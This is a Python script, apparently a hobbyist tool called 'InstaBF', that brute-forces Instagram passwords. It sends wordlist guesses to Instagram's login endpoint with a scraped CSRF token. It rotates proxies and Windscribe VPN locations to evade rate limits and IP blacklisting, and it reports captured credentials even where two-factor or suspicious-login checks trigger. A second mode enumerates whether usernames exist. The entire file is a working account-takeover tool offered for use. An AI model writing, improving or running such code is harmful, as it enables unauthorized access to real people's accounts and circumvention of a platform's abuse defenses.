#imports
import random
import requests
import os
from colorama import Fore, init
init()
#colorama.Fore.LIGHTCYAN_EX
from time import sleep
from datetime import datetime

usernamecheckerflag = False

#function to clear screen
def clear():
    if os.name == 'nt':
        _ = os.system('cls')
    else:
        _ = os.system('clear')

#function to change location
def change_location():
	codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W","FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
        
	choicecode = random.choice(codeList)
        
	try:
		os.system("windscribe connect " + choicecode)
	except:
		print("error")

#function for logging in
def login(username, password, proxy, proxynumber):
    global usernamecheckerflag

    #links for payload
    link = 'https://www.instagram.com/accounts/login/'
    login_url = 'https://www.instagram.com/accounts/login/ajax/'

    #sets time
    time = int(datetime.now().timestamp())

    #sets proxies
    proxies={"http": proxy, "https": proxy}

    #grabs csrf token
    response = requests.get(link, proxies=proxies)
    csrf = response.cookies['csrftoken']

    #sets payload
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    #sets headers
    login_header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": csrf
    }

    #displays attempt information
    print(Fore.LIGHTCYAN_EX+"Trying! "+username+': '+password+" Proxy: "+str(proxynumber))

    #sets up session for requests
    with requests.Session() as s:
        r = s.post(login_url, data=payload, headers=login_header)
        data = str(r.text)
        if usernamecheckerflag == True:
            print("checking username")
            usernamecheckerflag = False
            if '"user":true' in data:
                clear()
                print("User: "+username+" does exist")
                sleep(3)
                start()
            else:
                clear()
                print("User: "+username+" does NOT exist")
                sleep(3)
                start()

        #compares data to possible scenarios
        if '"authenticated":true' in data:
            print(Fore.LIGHTGREEN_EX+"Credentials found: "+username+" "+password)
            quit()
        if '"error_type":"two_factor_required"' in data:
            print(Fore.LIGHTGREEN_EX+"Credentials found, "+Fore.LIGHTRED_EX+"TWO FACTOR AUTH enabled")
            print(Fore.LIGHTGREEN_EX+"Credentials found: "+username+" "+password)
            quit()
        if '"checkpoint_url"' in data:
            print(Fore.LIGHTRED_EX+"SUSPICIOUS LOGIN DETECTED")
            print(Fore.WHITE+"User may or may not have been notified")
            print(Fore.LIGHTGREEN_EX+"Credentials: Username: "+username+" Password: "+password)
            quit()
        if '"spam":true' in data:
            if os.name != "posix":
                print(Fore.LIGHTRED_EX+"IP blacklisted, switch vpn locations")
                quit()
            else:
                locationlist = ["TR", "US-C", "US", "US-W", "CA", "CA-W","FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
                location = random.choice(locationlist)
                try:
                    os.system("windscribe connect "+location)
                except:
                    os.system("windscribe disconnect")

        if '"Please wait a few minutes before' in data:
            print(Fore.WHITE+"Settling, changing proxies...")
            sleep(180)





def start():
    global usernamecheckerflag
    clear()
    #input for data
    print(Fore.LIGHTCYAN_EX + """
====================================
 _____          _       ____________ 
|_   _|        | |      | ___ \  ___|
  | | _ __  ___| |_ __ _| |_/ / |_   
  | || '_ \/ __| __/ _` | ___ \  _|  
 _| || | | \__ \ || (_| | |_/ / |    
 \___/_| |_|___/\__\__,_\____/\_|
 VERSION 2.0, by MntlPrblm
 ===================================
 Bruteforcer [1]
 Username checker [2]
    """)
    decision = str(input(Fore.WHITE+"Input: "))
    if decision == "2":
        usernamecheckerflag = True
        clear()
        username = input("Username: ")
        login(username, "12345", None, 0)

    username = str(input(Fore.WHITE+"Username: ").lower())
    proxyfile = str(input("Proxy file: "))
    if os.path.exists(proxyfile) == False:
        clear()
        print("Proxy file: "+proxyfile+" not found")
        sleep(3)
        start()
    wordlist = str(input("Wordlist: "))
    if os.path.exists(wordlist) == False:
        clear()
        print("Wordlist file: "+wordlist+" not found")
        sleep(3)
        start()  

    #opens and splits passwordlist
    with open(wordlist, 'r') as x:
        passwordlist = x.read().splitlines()

    #opens proxy list and reads lines
    proxylist = open(proxyfile).read().splitlines()

    #counts number of proxies
    file = open(proxyfile,"r")
    proxylimit = 0
    Content = file.read()
    CoList = Content.split("\n")
    for i in CoList:
        if i:
            proxylimit += 1

    #runs the script to bruteforce login
    proxynumber = 0
    for password in passwordlist:
        if proxynumber == proxylimit:
            proxy = None
            proxynumber = 0
        else:
            proxy = (proxylist[proxynumber])
            proxynumber += 1
            login(username, password, proxy, proxynumber)
    print("Password not in wordlist")

if __name__=="__main__":
    start()
